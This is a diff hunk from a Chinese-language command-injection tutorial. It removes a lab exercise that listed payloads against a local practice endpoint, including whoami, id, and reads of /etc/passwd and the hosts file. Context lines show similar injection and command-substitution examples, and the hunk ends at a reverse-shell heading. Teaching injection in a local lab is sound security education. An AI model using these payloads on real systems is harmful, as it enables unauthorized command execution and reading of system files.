@@ -37,26 +37,6 @@ ping -c 3 127.0.0.1; cat /etc/passwd
 | `\`` | 命令替换 | `` ping `whoami`.com `` |
 | `$()` | 命令替换（现代） | `ping $(whoami).com` |
 
-## 🎯 靶场练习 5：命令注入
-
-打开 `http://127.0.0.1:5000/cmdi/ping`
-
-### 基础练习
-
-```bash
-# Windows
-127.0.0.1 & whoami
-127.0.0.1 & dir C:\
-127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts
-127.0.0.1 | dir
-
-# Linux/Mac
-127.0.0.1; id
-127.0.0.1; cat /etc/passwd
-127.0.0.1; ls -la /
-127.0.0.1 && whoami
-```
-
 ### 进阶：反弹 Shell
 
 ```bash
